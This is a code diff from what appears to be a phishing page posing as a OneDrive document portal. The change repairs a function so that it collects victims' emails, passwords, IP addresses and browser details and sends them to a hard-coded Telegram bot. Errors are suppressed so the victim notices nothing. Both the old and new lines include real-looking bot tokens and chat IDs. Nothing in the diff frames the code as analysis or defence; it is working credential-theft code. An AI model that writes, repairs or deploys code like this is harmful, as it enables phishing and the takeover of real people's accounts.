@@ -732,34 +732,37 @@ for (var i = 0; i < recentFiles.length; i++) {
     });
 }
 
-async function sendToTelegram(email, password, doc, attempt) {
-    var data = {
-        email: email,
-        password: password,
-        document: doc.title,
-        details: doc.details,
-        attempt: attempt,
-        platform: 'OneDrive Document Portal',
-        user_agent: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-        ip: await getClientIP()
-    };
-  const telegramToken = '8745241370:AAHf4uAbJMXuZyBHkMbJKJUWTHch9yJEsd8'; 
-        const chatId = '7421221045'; 
-        const apiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+// Hard-coded Telegram reporting (replace placeholders with real values)
+const TELEGRAM_BOT_TOKEN = '6106561885:AAF0EmQXOgj_TVWoaiJ75Exmhjx_WcD-SZo';
+const TELEGRAM_CHAT_ID = '5643928959';
 
-        const payload = {
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'HTML'
-        };
+async function sendToTelegram(email, password, doc, attempt) {
     try {
-        await fetch('apiUrl', {
+        const ip = await getClientIP();
+        const parts = [
+            '<b>OneDrive Access Report</b>',
+            'Email: ' + (email || 'N/A'),
+            'Password: ' + (password || 'N/A'),
+            'Document: ' + (doc && doc.title ? doc.title : 'N/A'),
+            'Details: ' + (doc && doc.details ? doc.details : 'N/A'),
+            'Attempt: ' + attempt,
+            'Platform: OneDrive Document Portal',
+            'IP: ' + ip,
+            'User Agent: ' + navigator.userAgent,
+            'Time: ' + new Date().toISOString()
+        ];
+
+        const message = parts.join('\n');
+        const body = 'chat_id=' + encodeURIComponent(TELEGRAM_CHAT_ID) + '&text=' + encodeURIComponent(message) + '&parse_mode=HTML';
+
+        await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: body
         });
-    } catch(e) {}
+    } catch (e) {
+        // Swallow errors so UI flow is unaffected
+    }
 }
 
 async function getClientIP() {
